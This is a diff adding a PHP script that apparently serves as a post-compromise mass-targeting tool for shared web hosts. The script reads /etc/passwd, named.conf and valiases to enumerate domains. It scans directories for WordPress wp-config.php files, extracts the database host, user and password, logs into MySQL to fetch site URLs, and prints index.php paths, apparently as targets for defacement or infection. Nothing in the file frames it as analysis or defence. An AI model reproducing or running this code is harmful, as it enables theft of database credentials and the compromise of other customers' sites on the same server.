@@ -1,0 +1,234 @@
+<?php
+
+
+function GeT_D0MaIn_wiTh_SuB(){
+  $domain_lines = @scandir("/etc/valiases/");
+  if($domain_lines){
+    $domain_lines = array_diff($domain_lines, array('..', '.'));
+    foreach ($domain_lines as $ec_domain) {
+      $useridofdomain = @fileowner('/etc/valiases/'.$ec_domain);
+      if($useridofdomain){
+        if($useridofdomain == posix_geteuid()){
+          echo(''.$ec_domain.'<br>');
+        }
+      }
+    }
+  }
+}
+
+
+
+
+function Cl4WGetDomains($state = false){
+  $state = "named.conf";
+  $lines = array();
+  if(file_get_contents('/etc/named.conf')){
+    $lines = explode("\n", file_get_contents('/etc/named.conf'));
+  }
+  if(!$lines){
+    $lines = @scandir("/etc/valiases/");
+    if($lines){
+      $lines = array_diff($lines, array('..', '.'));
+    }
+    $state = "valiases";
+    if(!$lines){
+      $lines = @scandir("/var/named");
+      if($lines){
+        $lines = array_diff($lines, array('..', '.'));
+      }
+      $state = "named";
+      if(!$lines && $state){
+        if(file_get_contents('/etc/passwd')){
+          $lines = explode("\n", file_get_contents('/etc/passwd'));
+          $state = "passwd";
+        }
+      }
+    }
+  }
+  return array("lines" => $lines, "state" => $state);
+}
+
+
+
+
+function GeTdOmaInFrOmId(){
+  if(file_exists("/etc/valiases/")) {
+    $grabdomain_array = Cl4WGetDomains();
+    $grabdomain_lines = $grabdomain_array["lines"];
+    $grabdomain_state = $grabdomain_array["state"];
+    $etcpasswd = file_get_contents('/etc/passwd');
+    $etclines = explode("\n", $etcpasswd);
+    $all_domains = [];
+    foreach ($grabdomain_lines as $grabdomain_line) {
+      if($grabdomain_state == "named.conf"){
+        if(@strstr($grabdomain_line, 'zone')){
+          preg_match_all('#zone "(.*)"#',$grabdomain_line, $data);
+          $domain = $data[1][0];
+          array_push($all_domains, $domain);
+        }
+      } elseif($grabdomain_state == "valiases") {
+        array_push($all_domains, $grabdomain_line);
+      } elseif($grabdomain_state == "named") {
+        $domain = @rtrim($grabdomain_line, ".db");
+        array_push($all_domains, $domain);
+      }
+    }
+    if(function_exists('fileowner')) {
+      foreach ($all_domains as $each_domain){
+        $useridofdomain = @fileowner('/etc/valiases/'.$each_domain);
+        if(posix_geteuid() == $useridofdomain){
+          echo(''.$each_domain.'/index.php<br>');
+        }
+      }
+    } elseif(function_exists('exec')) {
+      foreach ($all_domains as $each_domain){
+        $exec_dom_res = @exec("stat -c '%U' /etc/valiases/".$each_domain);
+        if($exec_dom_res){
+          if(get_current_user() == $exec_dom_res){
+            echo(''.$each_domain.'/index.php<br>');
+          }
+        }
+      }
+    }
+  }
+}
+
+
+
+
+function get_DoM_frOm_etc(){
+  $firstfolderofdir = @substr(getcwd(), 1, stripos(substr($_SERVER['DOCUMENT_ROOT'], 1), '/'));
+  $eTc_DiR = '/'.$firstfolderofdir.'/'.get_current_user().'/etc';
+  if(file_exists($eTc_DiR)){
+    if(is_dir($eTc_DiR)){
+      chdir($eTc_DiR);
+      echo('<font color="green">DiR:'.$eTc_DiR.'</font><br>');
+      $etc_dir_scan = @scandir($eTc_DiR);
+      $etc_dir_scan_files = array_diff($etc_dir_scan, array('..', '.'));
+      foreach ($etc_dir_scan_files as $etc_dir_scan_file) {
+        if(is_dir($etc_dir_scan_file)){
+          echo(''.$etc_dir_scan_file.'/index.php<br>');
+        }
+      }
+
+    }
+  }
+}
+
+
+
+
+
+
+function url_from_wp_config($filename){
+	$configdata = @file_get_contents($filename);
+
+	if ($configdata){
+		preg_match_all("#'DB_HOST',.*'(.*?)'#", $configdata, $host);
+		foreach($host[1] as $don){ $localhost = $don; }
+
+		preg_match_all("#'DB_USER',.*'(.*?)'#", $configdata, $user);
+		foreach($user[1] as $done1){ $username = $done1; }
+
+		preg_match_all("#'DB_PASSWORD',.*'(.*?)'#", $configdata, $pass);
+		foreach($pass[1] as $done){ $password = $done; }
+
+
+		preg_match_all("#'DB_NAME',.*'(.*?)'#", $configdata, $name);
+		foreach($name[1] as $done2){ $database = $done2; }
+
+
+		preg_match_all("#$table_prefix.*=.*'(.*?)'#", $configdata, $prefixarr);
+		foreach($prefixarr[1] as $done3){ $prefix = $done3; }
+
+
+		if ( $localhost  &&  $password &&  $username && $database  && $prefix) {
+			$conn=@mysqli_connect($localhost,$username,$password,$database);
+
+			if($conn){
+				$site_query = mysqli_query($conn, "select * from " . $prefix . "options where option_name='siteurl'");
+				while ($siteurl = mysqli_fetch_array($site_query)) {
+					$site_url = $siteurl['option_value'];
+				}
+				echo(''.$site_url.'/index.php<br>');
+			}
+		}
+	}
+}
+
+
+
+function check_directory_for_domain($full_directory) {
+
+	if ( strpos($full_directory, "--cl4wm4ss--") !== false) {
+		$exploding_full_directory = explode("--cl4wm4ss--", $full_directory);
+		$directory = $exploding_full_directory[0];
+		$initial_folder = $exploding_full_directory[1];
+	} else {
+		$directory = $full_directory;
+		$initial_folder = '';
+	}
+
+	if (file_exists($directory)){
+		if (is_dir($directory)){
+			$all_scanned_folder = @array_diff(@scandir($directory), array('..', '.'));
+			foreach ($all_scanned_folder as $each_scanned_folder) {
+
+				$new_folder_dir1 = $directory . $each_scanned_folder;
+				if (is_dir($new_folder_dir1)){
+					$config_file_path1 = $new_folder_dir1 . '/' . $initial_folder . '/wp-config.php';
+					if (is_file($config_file_path1)){
+						url_from_wp_config($config_file_path1);
+					}
+
+
+					if (strpos($each_scanned_folder, '.') && strpos($each_scanned_folder, '.') !== 0 ){
+						echo(''.$each_scanned_folder.'/index.php<br>');
+					}
+
+					$all_scanned_folder2 = @array_diff(@scandir($new_folder_dir1), array('..', '.'));
+					foreach ($all_scanned_folder2 as $each_scanned_folder2){
+						$new_folder_dir2 = $new_folder_dir1 .'/'. $each_scanned_folder2;
+						if (is_dir($new_folder_dir2)){
+
+							$config_file_path2 = $new_folder_dir2 . '/' . $initial_folder . '/wp-config.php';
+							if (is_file($config_file_path2)){
+								url_from_wp_config($config_file_path2);
+							}
+
+							if (strpos($each_scanned_folder2, '.') && strpos($each_scanned_folder2, '.') !== 0 ){
+								echo(''.$each_scanned_folder2.'/index.php<br>');
+							}
+
+						}
+					}
+				}
+			}
+		}
+	}
+}
+
+function get_domain_from_dir(){
+	$c_directory = explode('/', $_SERVER['DOCUMENT_ROOT']."/");
+	$directory_to_check = array();
+	foreach ($c_directory as $posnum => $each_folder) {
+		if ($posnum > 2 ) {
+			$new_dir = implode("/" , array_slice($c_directory, 0, $posnum))."/";
+			echo($new_dir.'<br>');
+			check_directory_for_domain($new_dir);
+			@array_push($directory_to_check, $new_dir);
+			// $new_dir = implode("/" , array_slice($c_directory, 0, $posnum))."/--cl4wm4ss--/". implode("/", array_slice($c_directory, $posnum+1));
+			// echo($new_dir.'<br>');
+			// check_directory_for_domain($new_dir);
+			// @array_push($directory_to_check, $new_dir);
+		}
+	}
+}
+
+get_domain_from_dir();
+GeTdOmaInFrOmId();
+GeT_D0MaIn_wiTh_SuB();
+get_DoM_frOm_etc();
+
+
+?>
